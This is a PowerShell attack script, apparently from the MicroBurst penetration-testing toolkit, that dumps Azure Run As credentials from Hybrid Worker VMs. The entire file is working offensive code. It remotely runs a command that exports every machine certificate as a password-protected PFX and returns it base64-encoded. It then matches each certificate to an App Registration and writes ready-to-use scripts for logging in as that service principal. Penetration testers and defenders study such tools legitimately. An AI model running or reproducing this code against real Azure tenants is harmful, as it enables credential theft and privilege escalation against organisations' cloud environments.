<#
    File: Invoke-AzHybridWorkerExtraction.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2022
    Description: PowerShell function for dumping Azure Run as credentials from Hybrid Worker VMs using the Az PowerShell CMDlets.

    Potential Improvements:
        - Correct for multiple PFX files returned from hybrid worker
        - Add VM filter to specify VM to attack
#>

# Check if the Az Module is installed and imported
if(!(Get-Module Az)){
    try{Import-Module Az -ErrorAction Stop}
    catch{Install-Module -Name Az -Confirm}
    }

function Invoke-AzHybridWorkerExtraction{

<#

    .SYNOPSIS
        Dumps all available Run as certificates from Windows VMs with the Hybrid Worker extension in an Azure subscription. Use the resulting "AuthAs" ps1 scripts to make use of the extracted credentials.
    .DESCRIPTION
        This function will look for any VMs with the Hybrid Worker extension installed and will run a command to export any stored Run as certificates from the cert store.
    .PARAMETER Subscription
        Subscription to use.
    .EXAMPLE
        PS C:\MicroBurst> Invoke-AzHybridWorkerExtraction -Verbose
        VERBOSE: Logged In as kfosaaen@notarealdomain.com
        VERBOSE: Getting a list of Hybrid Worker VMs
        VERBOSE: 	Running extraction script on the HWTest virtual machine
        VERBOSE: 		Looking for the attached App Registration... This may take a while in larger environments
        VERBOSE: 			Writing the AuthAs script
        VERBOSE: 		Use the C:\temp\HybridWorkers\AuthAsNetSPI_tester_[REDACTED].ps1 script to authenticate as the NetSPI_sQ[REDACTED]g= App Registration
        VERBOSE: 	Script Execution on HWTest Completed
        VERBOSE: Run as Credential Dumping Activities Have Completed

    .LINK
        https://www.netspi.com/blog/technical/cloud-penetration-testing/abusing-azure-hybrid-workers-for-privilege-escalation/
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = ""
    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
    
    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Invoke-HybridWorkerExtraction -Subscription $sub}
        break
    }

    Write-Verbose "Logged In as $accountName"

    # Command to run on the VMs
    "`$mypwd = ConvertTo-SecureString -String ""TotallyNotaHardcodedPassword..."" -Force -AsPlainText;Get-ChildItem -Path cert:\localMachine\my\| ForEach-Object{ try{ Export-PfxCertificate -cert `$_.PSPath -FilePath (-join(`$_.PSChildName,'.pfx')) -Password `$mypwd | Out-Null; [Convert]::ToBase64String([IO.File]::ReadAllBytes((-join(`$PWD,'\',`$_.PSChildName,'.pfx')))); remove-item (-join(`$PWD,'\',`$_.PSChildName,'.pfx'))}catch{}}" | Out-File -FilePath ".\tempscript.ps1"

    Write-Verbose "Getting a list of Hybrid Worker VMs"

    # Find the Windows VMs with the Hybrid Worker Extension
    Get-AzVM -status | Where-Object {(($_.StorageProfile.OSDisk.OSType -eq 'Windows')) -and ($_.PowerState -eq "VM running")} | Get-AzVMExtension | ForEach-Object {
        if($_.Name -eq "HybridWorkerExtension"){
    
            $vmName = $_.VMName

            Write-Verbose "`tRunning extraction script on the $vmName virtual machine"

            Try{

                $scriptOutput = Invoke-AzVMRunCommand -ResourceGroupName $_.ResourceGroupName -VMName $_.VMName -CommandId RunPowerShellScript -ScriptPath ".\tempscript.ps1" -ErrorAction SilentlyContinue

                $cmdOut = $scriptOutput.Value[0].Message
            
                [IO.File]::WriteAllBytes("$PWD\testCertificate.pfx",[Convert]::FromBase64String($cmdOut))

                $mypwd = ConvertTo-SecureString -String "TotallyNotaHardcodedPassword..." -Force -AsPlainText
                $pfxData = (Get-PfxData "$PWD\testCertificate.pfx" -Password $mypwd).EndEntityCertificates
                $pfxSubject = $pfxData.Subject
                $pfxThumb = $pfxData.Thumbprint
                $newCert = (-join($pfxSubject.Split("=")[1],".pfx"))

                Move-Item "$PWD\testCertificate.pfx" $newCert


                # Find the App ID by CertThumbprint
                Write-Verbose "`t`tLooking for the attached App Registration... This may take a while in larger environments"

                # Take each App Registration, get the available certs, match the thumbprints
                Get-AzADApplication | ForEach-Object{
                    $appTempId = $_.ApplicationId
                    $appTempName = $_.DisplayName
                    $_ | Get-AzADAppCredential | ForEach-Object{ if($_.CustomKeyIdentifier -EQ $pfxThumb){$appClientID = $appTempId; $appRegName = $appTempName}}
                }

                $tenantId = (get-azcontext).Tenant.Id

                $outFile = (-join($pwd,'\AuthAs',$pfxSubject.Split("=")[1],".ps1"))

                Write-Verbose "`t`t`tWriting the AuthAs script"

                # Write the AuthenticateAs Script
                "`$thumbprint = '$pfxThumb'" | Out-File $outFile
                "`$tenantID = '$tenantId'" | Out-File -Append $outFile
                "`$appId = '$appClientID'" | Out-File -Append $outFile
                "`$mypwd = ConvertTo-SecureString -String ""TotallyNotaHardcodedPassword..."" -Force -AsPlainText" | Out-File -Append $outFile
                "Import-PfxCertificate -FilePath $newCert -CertStoreLocation Cert:\LocalMachine\My -Password `$mypwd" | Out-File -Append $outFile
                "Add-AzAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -Append $outFile

                Write-Verbose "`t`tUse the $outFile script to authenticate as the $appRegName App Registration"
                Write-Verbose "`tScript Execution on $vmName Completed"                
            }
            Catch{Write-Verbose "`t`tError in command excution. Check the Azure Activity Log for more details."}
        }
    }
    
    # Remove the temp script
    Remove-Item ".\tempscript.ps1"

    Write-Verbose "Run as Credential Dumping Activities Have Completed"

}